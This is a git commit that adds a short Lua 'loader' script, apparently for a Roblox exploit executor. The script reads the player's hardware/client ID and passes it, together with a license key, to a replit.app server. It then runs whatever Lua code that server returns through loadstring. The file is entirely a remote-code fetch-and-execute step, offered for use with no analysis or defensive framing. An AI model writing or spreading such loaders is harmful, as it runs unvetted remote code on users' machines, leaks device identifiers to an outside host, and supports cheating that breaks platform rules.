47fd26ba154179af6cc19e43407a0a809d3b2937
UchiwaJoiner <uchiwajoiner@gmail.com>
2026-04-29 06:46:15 +0200

    Add loader UCHIWA_02FYPGHP.lua

---
+++ UCHIWA_02FYPGHP.lua
@@ -0,0 +1,4 @@
+-- UCHIWA Loader | UCHIWA-02FYPGHP
+getgenv().Key = "UCHIWA-02FYPGHP"
+local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+loadstring(game:HttpGet("https://python-flask-server--yassin98087.replit.app/aj.lua?key=" .. getgenv().Key .. "&hwid=" .. hwid))()
